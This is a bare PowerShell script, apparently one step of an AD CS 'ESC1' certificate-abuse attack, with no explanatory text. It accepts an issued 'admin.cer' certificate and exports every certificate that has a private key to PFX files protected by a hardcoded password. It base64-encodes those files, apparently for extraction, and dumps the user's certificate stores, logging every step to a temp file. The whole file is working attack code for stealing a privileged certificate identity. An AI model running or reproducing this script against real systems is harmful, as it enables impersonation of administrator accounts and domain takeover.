$ErrorActionPreference = 'Continue'
$out = 'C:\Windows\Temp\esc1\step.txt'
function W($x){ Add-Content $out ([string]$x) }
Remove-Item $out -Force -EA SilentlyContinue
W 'start'
W (whoami)
try {
  $r = certreq -accept 'C:\Windows\Temp\esc1\admin.cer' 2>&1 | Out-String
  W "accept:$r"
} catch { W "acceptERR:$_" }

$certs = @(Get-ChildItem 'Cert:\CurrentUser\My' -EA SilentlyContinue)
W "count=$($certs.Count)"
foreach ($c in $certs) {
  W "TH=$($c.Thumbprint)|S=$($c.Subject)|K=$($c.HasPrivateKey)"
}

$pwd = ConvertTo-SecureString 'Pfx123!' -AsPlainText -Force
foreach ($c in $certs) {
  if (-not $c.HasPrivateKey) { continue }
  $pfx = "C:\Windows\Temp\esc1\$($c.Thumbprint).pfx"
  try {
    Export-PfxCertificate -Cert $c -FilePath $pfx -Password $pwd -Force | Out-Null
    W "OK $pfx $((Get-Item $pfx).Length)"
    $bytes = [IO.File]::ReadAllBytes($pfx)
    $b64 = [Convert]::ToBase64String($bytes)
    [IO.File]::WriteAllText("C:\Windows\Temp\esc1\$($c.Thumbprint).b64", $b64)
    W "B64LEN=$($b64.Length)"
  } catch { W "EXPFAil $_" }
}

# fallback: certutil export from request container?
W '---certutil My---'
certutil -store -user My 2>&1 | Select-Object -First 60 | ForEach-Object { W $_ }

# If no private key, key may be under REQUEST store
W '---REQUEST---'
certutil -store -user REQUEST 2>&1 | Select-Object -First 40 | ForEach-Object { W $_ }
Get-ChildItem 'Cert:\CurrentUser\REQUEST' -EA SilentlyContinue | ForEach-Object { W "REQ $($_.Thumbprint)" }

Get-ChildItem 'C:\Windows\Temp\esc1' | ForEach-Object { W "FILE $($_.Name) $($_.Length)" }
W 'end'
Get-Content $out -Raw
